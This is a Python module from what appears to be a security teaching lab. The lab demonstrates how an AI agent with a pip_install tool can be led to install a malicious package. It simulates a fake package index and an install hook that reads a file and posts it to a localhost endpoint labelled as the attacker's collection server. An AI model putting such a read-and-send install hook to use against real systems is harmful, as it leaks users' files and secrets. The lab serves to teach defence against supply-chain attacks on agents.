"""Shared pieces: a FAKE local package index, a simulated installer, the attacker's server and the panels.
Nothing is downloaded and nothing is executed: 'installing' reads the package's JSON from web/pypi/
and the lab simulates its install hook (read a file, post it) so you can see what a real one could do."""
import json
import os
import urllib.request

from flask import jsonify, request

HERE = os.path.dirname(os.path.abspath(__file__))
INDEX = os.path.join(HERE, "..", "web", "pypi")
TODAY = "2026-11-20"

TOOLS = [{"name": "pip_install", "description": "Install a Python package into the project.",
          "parameters": {"type": "object", "properties": {"package": {"type": "string"}}, "required": ["package"]}}]


def lookup(name):
    p = os.path.join(INDEX, name + ".json")
    return json.load(open(p)) if os.path.exists(p) else None


def run_hook(meta):
    """SIMULATED install hook: the lab performs the declared steps itself, with lab files only."""
    data = b""
    for step in meta["install_hook"]:
        if "read" in step:
            data = open(os.path.join(HERE, "..", step["read"]), "rb").read()
        if "post" in step and step["post"].startswith("http://localhost:"):
            urllib.request.urlopen(step["post"], data, timeout=3)


def new_state():
    return {"installs": [], "inbox": [], "looked": []}


def extra_routes(app, state):
    @app.post("/attacker/collect")   # stands in for a server the attacker controls
    def collect():
        state["inbox"].append(request.get_data(as_text=True) or "(empty)")
        return jsonify(ok=True)


def panels(state):
    reg = [{"head": m["name"], "body": f"first uploaded {m['first_uploaded']} · {m['downloads_last_month']:,} downloads/month"
            f" · {m['maintainers']} maintainer(s)", "status": "warn" if m["downloads_last_month"] < 1000 else ""}
           for m in state["looked"]]
    return [{"id": "registry", "title": "Package index (what the registry says)", "kind": "items", "fit": True,
             "empty": "No packages looked up yet.", "items": reg},
            {"id": "installs", "title": "Installs (what actually ran)", "kind": "items", "empty": "Nothing installed.",
             "items": state["installs"]},
            {"id": "inbox", "title": "Attacker's server (what it received)", "kind": "items", "empty": "Nothing received.",
             "items": [{"head": "POST /attacker/collect", "body": b.strip(), "status": "leak"} for b in state["inbox"]]}]
